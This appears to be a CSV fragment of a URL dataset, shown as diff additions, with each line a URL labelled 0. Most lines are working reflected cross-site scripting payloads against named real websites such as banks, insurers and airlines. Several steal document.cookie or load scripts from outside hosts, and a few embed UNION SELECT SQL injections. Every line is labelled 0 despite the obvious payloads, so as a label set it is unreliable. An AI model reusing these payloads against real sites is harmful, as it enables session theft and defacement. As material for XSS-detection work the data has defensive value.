+"http://www.francecars.fr/compte.php?action=connexion&email=/""><script>alert('Xss ByAtm0n3r')</script>&pass=ljkv&input_connexion.x=0&input_connexion.y=0",0
+http://jogjacamp.org/demo/jcommerce_demo/index.php?action=store.showProduct&product_id=%3Cscript%20src=http://xwungu.net46.net/xss.js%3E%3C/script%3E,0
+"http://reprise-entreprise.lefigaro.fr/evaluation-entreprise.html?ca=&id_secteur_activite=&date_operation=&mots_cles=""><script>alert('Xss By Atm0n3r')</script>&x=40&y=12",0
+http://windowslivehelp.com/reportabuse.aspx?an=1&postid=ad98bb9f-ce1d-4aff-bfcc-cc7c4e6fe1e1%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E,0
+http://tw.socialgame.yahoo.net/link.php?exp_url=http://vaibs.site50.net/scriplet.html,0
+http://video.syfy.com/search/q/%27%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C/script%3E,0
+http://sp.ask.com/toolbar/nascartb/nascarfx/insider.php?tb=NSC-O&trackid=%22%3E%3Cscript%3Ealert(/www.trlink.net/)%3C/script%3E,0
+"http://linkdefteri.com/devami.php?kategori=18=""><script>alert(document.cookie)</script><marquee>ThR0ad</marquee>",0
+"https://www.us.hsbc.com/1/2/3/hsbcpremier?code="" onmouseover=""alert(1);",0
+https://winelibrary.com/login.asp?back=/myordertracking.asp%22%3E%3Cscript%3Ealert(1337)%3C/script%3E,0
+http://www.dailymotion.com/factory/videowall?list=/related/x5198u/1%27%22%3E%3Cscript%3Ealert(/XSS/.source)%3C/script%3E,0
+http://www.hbeu1.hsbc.com/ukservices/branchlocator/area.asp?area=%27%22%3E%3Cmarquee%3E%3Cimg%20src=k.png%20onerror=alert(/XSS/.source)%20/%3E,0
+http://ubisoftpoint.ubisoft.it/canvas_detail.php?id=61%27%22%3E%3Cmarquee%3E%3Cimg%20src=k.png%20onerror=alert(/XSS/.source)%20/%3E,0
+"http://www.kaspersky.cl/certificaciones/?year=>""><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>",0
+http://fa.austenco.ir/content.asp?CatId=276&ContentType=%3Cscript%3Ealert%28%22amirmagic%22%29%3C/script%3E,0
+"http://technet.microsoft.com/tr-tr/objectforward/default(en-us).aspx?type=VideoPlayer&video=[XSSEDBY JESTER]""><script>alert(document.cookie)</script>",0
+"http://tolan-sd.com/product_detail.php?secid=""><script>alert(1)</script>",0
+http://www.cybersnipa.com/support/index.php?page=ticket_search&q=%27%22--%3E%3Cscript%3Ealert%28/xssed%20by%20hax0rl33t/%29%3C/script%3E,0
+"http://www.aa.com/reservation/multiCitySearchAccess.do?anchorEvent=false&from=Nav&originAirport=""><img src=x onerror=alert(1);>",0
+"http://www.aa.com/i18n/reservations/whyBookAACom.jsp?origin=-->""><img src=x onerror=alert(1);>",0
+http://cook.boom.ge/?&m=516&search_products=%22%20onmouseover%3dprompt%28917862%29%20bad%3d%22,0
+https://elibrary2.eosintl.com/P94008Staff/OPAC/MyAccount/Signin.asp,0
+http://fta.inria.fr/apache2-default/pmwiki/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+https://secure.derwesten.de/registrierung/index.php,0
+http://ru.espacenet.com/search97cgi/s97_cgi.exe?Action=FormGen&Template=<script>alert('E1')</script>,0
+"http://www.healthkart.com/search?query=""/><script>alert(""Xss:Vijayendra"")</script>&search.x=0&search.y=0",0
+"https://tv.adobe.com/login/login?redirect=index.cfm%22%3E%3Cscript%3Ewindow.location.assign(""http://www.reddit.com/r/xss/"")%3C/script%3E",0
+http://kaspersky.softkey.ru/?prodid=541501'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&site=642&from=3201552&noreg=Y&clear=Y&referer1=kl_main&referer2=kl_store,0
+"http://www.lds.org/placestovisit/search/1,10403,1603-1-1,00.html",0
+http://search.babeland.com/?Ntt=%3Cscript%3Ealert(document.domain)%3C/script%3E&N=1000030&Nty=1&sid=128363C03FAE,0
+http://email.one.lt/index.html?email-id=2&layout=%3Ciframe%20src=%22http://xssed.com%22%3E,0
+"http://www.aetna.com/docfind/disclaimer.jsp?site_id=medicare%22%3E%3Cscript%3Ealert(1337)%3C/script%3E,asdf",0
+"https://www.aetna.com/planselection/mbrDis.jsp?id=375""><script>alert(1337)</script>",0
+http://www.aetna.com/docfind/docfind_survey.jsp?survey=Aexcel&psid=nullaaa%22%3E%3Cscript%3Ealert(1337)%3C/script%3E&netid=null&xmflg=null,0
+"https://member.aetna.com/member_registration/info.jsp?startPage=rxMOD""><script>alert(1337)</script>",0
+http://www.carstereo.com/classifieds/results.cfm?search=%22%3E%3Cscript%3Ealert(%2Fxssed%2F)%3C%2Fscript%3E&x=6&y=17,0
+http://www.ebrio.com/shopcustadmin.asp?msg=%3Cscript%3Ealert('Th3%w0LfR4m%20Ask3r1%20Har3kat%%Team');%3C/script%3E,0
+"http://www.deu.edu.tr/DEUWeb/Icerik/Icerik.php?KOD=""><script>alert(""XSS"")</script>",0
+http://farsiebook.com/search/frame.php?url=http://www.xssed.com,0
+"http://www.fire.nsw.gov.au/page.php?id=-1+UNION+SELECT+1,0x53514C20496E6A656374696F6E202B205853536564206279203434343134452E3135,0x3A29,0x3A29,0x3A29,6,7,0x3C656D626564207372633D22687474703A2F2F7777772E796F75747562652E636F6D2F762F6F486735534A595248413026686C3D656E2666733D312672656C3D30266175746F706C61793D312220747970653D226170706C69636174696F6E2F782D73686F636B776176652D666C617368222077696474683D2236343022206865696768743D2235303522202F3E,9,10,11,12,13,14,15,16,17,18",0
+"http://www.nhs.vic.edu.au/index.php?id=1234+UNION+SELECT+1,2,3,4,5,6,7,8,0x3C656D626564207372633D22687474703A2F2F7777772E796F75747562652E636F6D2F762F6F486735534A595248413026686C3D656E2666733D312672656C3D30266175746F706C61793D312220747970653D226170706C69636174696F6E2F782D73686F636B776176652D666C617368222077696474683D2236343022206865696768743D2235303522202F3E,10,0x53514C20496E6A656374696F6E202B205853536564206279203434343134452E3135,12,13",0
+http://www.saraswatbank.com/cms_search.jsp?searchString=%22%3E/r0hit/%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cscript%20src=http://infysec.net/x.js%3E%3C/script%3E,0
+https://renewals.symantec.com/renewals/application?source_code=WEB&entry_point=sym_lrc%22;alert(%22XSS%22);//%22&inid=us_pagenotfound_smb_store,0
+http://ec.europa.eu/staffdir/plsql/gsys_word.search?pLang=%22%3E%3Cscript%3Ealert%281337%29%3C/script%3E,0
+http://comment.ynet.com/comments.jsp?url=http://www.ynet.com/view.jsp?oid=&oid=10975385&publish=yes&newstitle=<script>alert(1)</script>,0
+http://www.bitgamer.su/recover.php,0
+http://jicama.cs.washington.edu:8080/hudson/user/Sony/,0
+https://irmis-dev.bnl.gov/jenkins/user/SonyStyles/,0
+http://www.symantec.com/business/support/index?page=content&id=TECH122943'%2Balert%28%22xss%22%29%2B'&locale=en_US,0
+"http://www.mytelus.com/internet/set_region.do?rd=""><script>alert(/xss/)</script>",0
+http://autokatalog.auto.msn.de/liste.jsp?marke=&name=%3Cscript%3Ealert(document.cookie)%3C/script%3E,0
+http://europa.eu/sinapse/sinapse/index.cfm?&fuseaction=tools.message&message=%3Cscript%3Ealert(document.cookie)%3C/script%3E&title=Activity,0
+"http://www.crim.ca/fr/publications/inscription.html?action=sendMail/&captchaPhrase=1&email=1&name=</textarea>'""><script>alert(document.cookie)</script>",0
+http://mclient.msn.com.cn/voice.jsp?v=EB2Te0ymeg6TeNb%3D.wav%27%22%3E%3Cimg%20src=foo.png%20onerror=alert(/XSS/)%20/%3E%3CMARQUEE%20BGCOLOR=%22RED%22%3E%3CH1%3EXSS%20by%20Xylitol%3C/H1%3E%3C/MARQUEE%3E,0
+http://www.cisco.com/survey/exit.html?http://xssed.com/,0
+"http://canon.photo.free.fr/photos/achat/recherche.php?motclef=""><script>alert(document.cookie)</script>",0
+http://notrefamille.femmes.fr.msn.com/v2/services-blasons/liste-blasons.asp,0
+"http://ads1.msn.com/ads/58196/0000058196_000000000000000605878.swf?fd=ads.ak.facebook.com&clickTAG=javascript:alert(""xss by p3lo 50-1337 CreW"")",0
+http://www.club.it.porsche.com/home.php?id=%22%3E%3Cscript%3Ealert%281337%29%3C/script%3E,0
+"http://www.darty.com/webapp/wcs/stores/controller/DartyExtStoresZoneView?zone=fr_poitou.gif""><iframesrc=""http://xssed.com"">",0
+http://chef-n01.dmoz.aol.com:30080/cgi-bin/wpform.pl?cat=United_States%2FHI%2FXss%2F&name=%22%3E%3Cscript%3Ealert%28%27Rstcenter%27%29%3C%2Fscript%3E&nowhitepages=1,0
+http://mad.tv/news/new.php?c=<script>alert(/rusnaka be6e tuk/.source)</script>&id=-1,0
+http://sbj.saic.gov.cn/tjxx/TJTableSBSQHZC.asp?ND=XSS%22%3E%3Ciframe%3E%3C/iframe%3E,0
+http://allpoetry.com/login?use_referer=1&remember=1&name=%27%22%3E%3Cscript%3Ealert(%27XSS%20by%20BHO%27);%20document.body.innerHTML=%27XSS%20by%20BHO%27%3C/script%3E&password=&=Log%20in,0
+http://allpoetry.com/user/search?lucky=1&id=%27%22%3E%3Cscript%3Ealert(%27XSS%20by%20bho%27);%20document.body.innerHTML=%27%3Ch1%3EXSS%20by%20bho%3C/h1%3E%27%3C/script%3E&=Go,0
+http://serc.carleton.edu/serc/search.html?search_text=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&Search=search,0
+http://tweetgrid.com/search?q=%3Cimg+src%3D1+onerror%3Dalert%28document.cookie%29%3B%3E,0
+https://webeffective.keynote.com/login/recall.asp,0
+"http://www.kino.ru/film.php?id=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+http://procurement.gov.ge/php_thumb/demo/phpThumb.demo.showpic.php/1%3CScRiPt%3Eprompt%28112123%29%3C/ScRiPt%3E,0
+http://www.sporting-scene.com/search.asp?CategorySearch=%27%3C%22%3C%3CSCRIPT%3Ealert%28%27Codeshift3r%20Was%20Here%27%29;%3C/SCRIPT%3E,0
+http://www.movieposterbid.com/search.asp?kwsearch=%27%3C%22%3C%3CSCRIPT%3Ealert%28%27Codeshift3r+Was+Here%27%29%3B%3C%2FSCRIPT%3E,0
+http://www.notemax.com.br/main.php?core=listar&tt=Busca,0
+http://the-ethical-hacker.com/hello.php,0
+"http://www.president.al/english/pub/rubrika.asp?r=""><script>alert(""PirateAL"")</script>",0
+http://spaceflight.nasa.gov/cgi-bin/acronyms.cgi,0
+http://www.securetogether.com/SearchResults.aspx?kw=%3Cscript%3Ealert(%22by%20hac4ker%22);%3C/script%3E,0
+http://www.lepoint.fr/recherche/recherche.php?KEYWORDS=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&X=50&C=163,0
+http://software.gsfc.nasa.gov/llbycat.cfm?selCat=%3Chtml%3E%3Ctitle%3ET3%20is%20a%20Pirate%3C/title%3E%3Ch1%3ET3%20is%20a%20Pirate%3C/h1%3E%3Ca%20href=%22http://www.facebook.com%22%3EFacebook%20is%20a%20pirate%3C/a%3E%3Cbr%3E%3Cbr%3E%3CEMBED%20SRC=%22http://cristgaming.com/pirate.swf%22%20AllowScriptAccess=%22always%22%3E%3C/EMBED%3E%3C/html%3E%3Cbr%3E%3Cbr%3E,0
+http://www.jobpol.be/home/search_result/,0
+http://www.freetv.pk/live.php?tid=%22%3E%3Ciframe%20src=http://www.google.com%20width=500%20height=500%3E,0
+http://jiayuan.msn.com.cn/helpcenter/search.php?key=%3C/script%3E%3Cscript%3Ealert%28/Xss/%29%3C/Script%3E,0
+http://topics.msn.com.tw/news/SearchResultByBing.aspx?q=%22%3E%3CScript%3Ealert%28/xss/%29%3C/SCRIpt%3E,0
+http://hcg-ultra.cbsnews.archives.qopcgc.msnwt.com/?subid=%22%3E%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E,0
+http://www.filmhill.com/redirect.php?url=http://xssed.com,0
+https://support.discoverbing.com/eform.aspx?productKey=bingcontentremoval&ct=eformts'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(%22xss-regards%20from%20BG..Happy%20New%20Year%20:)%22)%3C/script%3E%20&scrx=1&retry=1&st=1&wfxredirect=1&locale=en-US,0
+https://www.speedtest.net/user-login.php,0
+http://www.retailcustomerexperience.com/%22%3E%3CSCRIPT%20SRC=http://lupbot.comule.com/aSU_aBANGjs.php%3E%3C/SCRIPT%3E,0
+"http://www.speedcubeshop.com/apps/webstore/search?utf8=&#10003;&sort=newest&query=""/><script>alert(""Xss: Vijayendra"")</script>",0
+http://yahooaction.com/?s=%22%3E%3Cscript%3Ealert%28%22Hacked%20By%20me%22%29%3C/script%3E,0
+http://www.indianyellowpages.com/search.php?term=%27+%22+%3E%3Ciframe+src%3D%22http%3A%2F%2Fwww.crazybucket.in%22%3E,0
+http://www.bangaloreclassifiedads.com/?q=%27+%22+%3E%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E&x=13&y=13,0
+http://www.indiacatalog.com/web_directory/search.php?Step=0&q=%27+%22+%3E%3Ciframe+src%3D%22http%3A%2F%2Fwww.crazybucket.in%22%3E&Search.x=35&Search.y=3,0
+"http://www.populararticles.com/index.php?q='+""+><script>alert(%2Fhacked+by+omega+ap3x%2F)<%2Fscript>&page=search&sa.x=31&sa.y=8",0
+http://muziek.downloaden.nl.msn.com/singles.php?cat=jazz%22%3E%3CScript%3Ealert%28/xss/%29%3C/script%3E,0
+http://www.umbro.com/1350-footwear/?locale=en_GB'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(%22XSS-BG%22)%3C/script%3E#/?locale=en,0
+http://www.mansion.com/EMERPECp/EMERPEventCollector.php?p=0&EventName='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(%22XSS-BG%22)%3C/script%3E?hphit&OnSuccess=EMERPCallback&ApplicationId=cp,0
+http://search.searchcompletion.com/WebSearchResults.aspx?q=%22%2F%3E%3Cscript%3Ealert%28%2FVijayendra%2F%29%3C%2Fscript%3E&si=99&bi=0&safe=off&originalSiteSeachDomain=&site=web&prevsite=web&cl=0&st=&lang=en-US&fh=1&cc=IN&sa=++Search++,0
+http://shop.skype.com/intl/en-in/search-results.html?locale=18093&q=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://b4s.co/epay.php,0
+http://westgenesee.org/District/District/staffresults.cfm,0
+http://juegos.latino.msn.com/home_dw_cat.jsp?cat=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,0
+"http://www.bradescoseguranca.com.br/default.asp?pag=J%22OnLoaD=%22location.href=%27javascript%27%2Bunescape%28/%3A/.source%29%2bString.fromCharCode%2897,108,101,114,116,40,39,88,83,83,69,68,39,41%29",0
+"http://libguides.miami.edu/searchtags.php?iid=155&tag=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",0
+http://www.pichincha.com/web/buscador.php?patron=//%22%3E%27%3E%3CSCRIPT%3Ealert%28%22[_UR0B0R0X_]%22%29%3C/SCRIPT%3E,0
+"http://www.oilfielddepot.net/rent/table.php?keywords=""><script>alert(42)</script><xxalt=""&Submit=Search",0
+"http://kevinbellamy.com/X7Chat/install.php?step=2%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E",0
+http://www.flipkart.com/ch.php?url=www.bing.com,0
+"http://nkjp.pl/index.php?page=0&lang=1""/><body onload=alert(1)>",0
+"http://www.homeshop18.com/shop/faces/jsp/search.jsp?q=""/></script><script>alert(""Xss :Vijayendra"")</script>",0
+"http://www.jabong.com/catalog/?q=""/></script><script>alert(""Xss:Vijayendra"")</script>&submit=&baseUrl=",0
+"http://www.bayt.com/en/job-search-results/?composite_search=1&keyword=""/><script>alert(""Xss:Vijayendra"")</script>",0
+http://www.searchcompletion.com/WebSearchResults.aspx?q=%22%2F%3E%3Ciframe+src%3D%22http%3A%2F%2Fgoogle.com%22%3E%3C%2Fiframe%3E&si=99&bi=0&safe=off&originalSiteSeachDomain=&site=web&prevsite=web&cl=0&st=&lang=en-US&fh=1&cc=IN&sa=++Search++,0
+"http://logiclord.com/index.php?x=0&y=0&s=""%2F><script>alert(""Xss: Vijayendra"")</script>",0
+http://www.hostelhelvetia.pl/index.php?page=%22/%3E%3Cbody%20onload=alert%281%29%3E&lang=en,0
+"http://www.pzl-wola.pl/index.php?page=home&lang=""/><body onload=alert(1)>",0
+http://xakep.ru/local/search/result.asp?tosearch=%3C/title%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+https://remote.utorrent.com/send?btih=6BD53DF2D2528D6A10C6A8DA457CAE38A522695C&dn=%3Cimg%20src=%22http://i40.tinypic.com/125l7ja.jpg%22%20/%3E&message=,0
+http://www.aam.org.my/forgotpassword_process.php,0
+http://search.adl.org/search?q=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E+Or%3A+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&btnG.x=12&btnG.y=16&btnG=Search&entqr=0&output=xml_no_dtd&sort=date%3AD%3AL%3Ad1&ie=UTF-8&lr=&client=adl&ud=1&site=adl&y=16&oe=UTF-8&proxystylesheet=adl&x=11,0
+http://www.tejaratbank.ir/portal/Page.aspx?search=<script>alert(document.cookie)</script>&mID=518&Page=search/advancedsearch&mDefId=,0
+http://www.designszeneberlin.de/search.php,0
+"https://ufc.tv/ufc/secure/signup?redirect='%22()%26%251%3CScRiPt%20%3Eprompt(%22hacked%20by%20s3rver.exe%20,%20OpUFC%20Anonymous%20CabinCr3w%22)%3C/ScRiPt%3E%3Cimg%20src=%22http://blogs-images.forbes.com/parmyolson/files/2011/08/anonymous-logo-1.jpg%22%20onerror=alert(document.cookie);%3E",0
+http://tain.totalcodex.net/search/?x=0&y=0&q=%3Cscript%3E++alert%28%2FVisit%20HaxInTheBox.BlogSpot.com%20For%20More%20XSS%2F%29%3B+%3C%2Fscript%3E&for=any,0
+http://img25.imagehaven.net/img.php?id=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://sds.sabre.com/DataBase/SubComp.asp?mdrver=1&mdrNam=ACHPRMASQREQST%3Ciframe%20src=%22http://xssed.com%22%3E,0
+http://www.mhp.net/search.php?q=%3Cscript%3E+alert%28%2FVisit%20HaxInTheBox.BlogSpot.com%20For%20More%20XSS%2F%29%3B+%3C%2Fscript%3E&submit=Go,0
+http://m.mediamarkt.de/node/8?plzInput=<img src=x onerror=alert(document.cookie)>,0
+"http://www.kkh-allianz.de/index.cfm?q="";alert(document.cookie)//&pageid=188&cof=FORID:11;NB:1",0
+"http://wwwapps.ups.com/WebTracking/track?loc=de_DE""style=background:url(http://data.xssed.org/images/xssed_logo.gif);width:247px;height:96px;position:absolute onmouseover=alert(navigator.userAgent) """,0
+http://www.gulp.de/cgi-gulp/robot.exe/SSEEK,0
+"http://www.hzd.de/irj/HZD_Internet?cid=7ec7f019ceb02fc4a3ff781ae0159923&MailFormsAction=submit""//--><img src=x onerror=alert(document.cookie)><!--",0
+https://www.shop.cdu.de/pages/kontakt/contact.php?p=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2fscript%3E,0
+http://www.chip-kiosk.de/catalogsearch/result/?q=<script>alert(navigator.userAgent)</script>,0
+"http://seminarsuche.tuev-nord.de/index.jsp?Marke=""><script>alert(document.cookie)</script>",0
+http://www.cubedepotusa.com/apps/forums/posts/search?topic_id=3188571-product-descriptions&query=%22%2F%3E%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E%3C%2Fiframe%3E,0
+"http://www.vr-gebrauchtwagen.de/cgi-bin/site_search.pl?search=""><script>alert(navigator.userAgent)</script>&GROUP=LANG_DE_GBW&HTML-NR=106",0
+http://img.virscan.org/js.php?js='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(/meeh%20infected/)%3C/script%3E%3C/title%3E%3Cmarquee%3E%3Ch1%3EXSS%20:)%3C/h1%3E%3Cmarquee%3E%3Cstrong%3E%3Cblink%3EXSS%20TEST%3C/blink%3E%3C/strong%3E%3C/marquee%3E%3Ch1%20%20%3EXSS%20:)%3C/h1%3E%3C/marquee%3E,0
+http://www.unet.univie.ac.at/~a0503736/php/drdoswiki/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>,0
+http://advertising.microsoft.com/austra123';alert(document.cookie);a=',0
+http://www.bullion.org.za/search/,0
+http://www.sonovela.net/list.php?q=pwn+%3CSCRIPT/SRC=%22http://tmp.vgood.com.tw/poc.js%22%3E%3C/SCRIPT%3E+pwn,0
+"http://wap.mercadolibre.com.ar/busqueda.php?kw=""><h1>Cross-Site Scripting <ahref=http://www.twitter.com/matiaslonigro>@matiaslonigro<sCript>alert(/xss/)</ScRipt>",0
+http://www.ebay.com.np/index.php?task=productdetails&pid=%22%3E%3Ch1%3ECross-Site%20Scripting%3CsCript%3Ealert%28/xss/%29%3C/ScRipt%3E,0
+"http://wap.mercadolibre.com.ar/producto.php?limit=""><h1>Cross-Site Scripting<ahref=http://www.twitter.com/matiaslonigro>@matiaslonigro<sCript>alert(/xss/)</ScRipt>",0
+http://support.microsoft.com/directory/article.asp?ID=http://google.com,0
+http://www.n9.fr/index.php?id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://www.jeudepaume.org/index.php?page=--%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Ciframe%20src=http://xssed.com%3E%3C/iframe%3Earticle&idArt=1470&lieu=1,0
+http://36317.calendars.motigo.com/day/show/date/2012-01-28,0
+http://234402.guestbooks.motigo.com/?action=index,0
+http://94932.forums.motigo.com/?action=email_send&boarduser_id=%22%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E,0
+http://biclopsgames.com/gameframe.php?id=7%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,0
+http://mappn.com/game.php?id=18%3Ciframe%20src=%22http://xssed.com%22%3E,0
+http://www.clanplanet.de/passwortservice.asp?rn=&notfounderr=set&email=%22%3E%3C/a%3E%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E%3Ca,0
+"http://estadisticas.idc.enet.cu/index.php?site=%27;alert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29//\%27;alert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29//%22;alert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29//\%22;alert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29%3C/SCRIPT%3E",0
+"http://www.nearlynewborn.com/store/error.asp?msg=<iframe src=""http://xssed.com"">",0
+"http://www.rfcuny.org/hr/pvn/cgi-bin/error.asp?msg=<iframe src=""http://xssed.com"">",0
+"http://triprayarnadanvarthakal.com/error.asp?msg=<iframe src=""http://xssed.com"">",0
+"http://www.soul-chic.com/error.asp?msg=<iframe src=""http://xssed.com"">",0
+"http://www.gectchem.org/error.asp?msg=<iframe src=""http://xssed.com"">",0
+"http://www.thebakerscottage.com/store/error.asp?msg=<iframe src=""http://xssed.com"">",0
+http://www.berta.ge/admin/index.php/%22onmouseover=prompt%28901957%29%3E,0
+http://www.newnet.ge/avtandil_iashvili.php?lang_id=%22%20onmouseover%3dprompt%28965176%29%20bad%3d%22,0
+http://orbi.ulg.ac.be/simple-search?query=%3Cscript%3Econfirm%28%22samir-dz-tjrs-maahboul-3lik%22%29%3C/script%3E%3Ciframe%20src=%22http://xssed.com%22%3E,0
+"http://shop.n-tv.de/Suche/?aExtendedSearch[priceFrom]=""><script>alert(document.cookie)</script>",0
+http://kompetenzatlas-hessen.de/suche/sucheaction_new.cfm?sort=firma&dir=ASC&startrow=1&superbid=,0
+"http://www.artchesul.com.br/site/views/produto/produto.php?id=136%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E",0
+"http://speedtest.net/results.php?ct=dp&ria=0p&s=0';</script><script>alert(""W00t..."")</script>",0
+"http://www.rtl.de/suche/google/suche?sitesearch=rtl&q='};document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,60,47,115,99,114,105,112,116,62))%0avar xss={'':'",0
+"http://www.totallyspies.com/_php/index.php?lang=uk"");alert(""xss"");//",0
+"http://search.sport1.de/index.php?search=""><script>alert(document.cookie)</script>",0
+"http://www.spielaffe.de/account/remote_login?user[auth_username]='""><script>alert(navigator.userAgent)</script>&layout=window",0
+"https://register.dailymail.co.uk/doRegisterCutDown?email=""><script>alert(document.cookie)</script>",0
+"http://www.clickajob.co.uk/cgi-bin/user.cgi?module=vacancy_search&task=search_results&keywords=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E",0
+"http://www.af-de-portu.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+http://www.wetter.de/shared/php/search_plz_ort.php?in=%253C%2500%253Cscript%253Ealert%28navigator.userAgent%29%253C/script%253E,0
+"http://www.imdb.com/find?q=xss&pg=tvschedule""><script>alert(document.cookie)</script>",0
+http://www.indiatimes.com/search/</title><script>alert(navigator.userAgent)</script>,0
+"http://www.gdn.edu/athletics/article.asp?NewsNo=-1+union+select+%22%3Cscript%3Ealert%281%29;%3C/script%3E%22,2,3,4,5,6,7,8,9,10,11,12+from+News",0
+http://www.fema.gov/library/viewRecord.do?id=<script>alert('XSS');</script>,0
+"http://slsweb.ocmboces.org/print.asp?p=no&id=2&ob=year%27&d=desc,7%20asc+union+select+%27%3Cscript%3Ealert%281%29%3C/script%3E%27,2,3,4,5,6,7+from+web_schools",0
+"http://www.samandehi.ir/mainMenuNL.html?conversationContext='""()%26%251<ScRiPt>alert('xssed')</ScRiPt>",0
+http://www.100bestbuy.com/product.php?id=2977%22%3E%3Cscript%3Ealert%28%22XsS--G4H%22%29%3C/script%3E,0
+"http://www.smimmobiliernarbonne.com/listing.php?langID=fr/""><script>alert('La patrone a de groooOoosseins !!')</script><script type=""text/javascript""src=""http://yourjavascript.com/27544112151/xss.atmon3r.js""></script>",0
+"http://www.immovisionfrance.com/immo-uzes/index.php?lang=fr/""><script>alert('Xss ByAtm0n3r')</script>",0
+"http://www.immobiliere-capyvelines.fr/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.immobiliere-michel-vautier.fr/index.php?lang=fr/""><script>alert('Xss ByAtm0n3r')</script>",0
+"http://www.agencebouziat.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.arte-patrimoine.com/index.php?lang=es/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.agencepleinsud.com/index.php?lang=it/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.cabinet-avril.com/index.php?lang=it/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.ajcimmobilier.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.immo-du-sud.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.agenceprodi.com/page.php?src=infoslegales.html&lang=fr/""><script>alert('Xss ByAtm0n3r')</script>",0
+http://www.thesecurityweb.co.uk/twiki/bin/view.pl/Security/SonyStyles,0
+http://wiki.clamav.net/bin/view/Main/SonyStyles,0
+"http://france-engels.fr/search_form.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.mazagrandimmobilier.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.vip-dream.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.corinneponce-immobilier.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.sernin-immobilier.com/details.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.azur-privilege.com/page.php?src=index-ap.html&lang=fr/""><script>alert('Xss ByAtm0n3r')</script>",0
+"http://www.dominiquealboublanc.com/page.php?src=infoslegales.html&lang=fr/""><script>alert('Xss ByAtm0n3r')</script>",0
+"http://www.immobilier-paris-verneuil.com/index.php?lang=fr/""><script>alert('Xss ByAtm0n3r')</script>",0
+"http://www.collin-immobilier.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.agence-rci.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
+"http://www.riviera-housing.com/index.php?lang=fr/""><script>alert('Xss By Atm0n3r')</script>",0
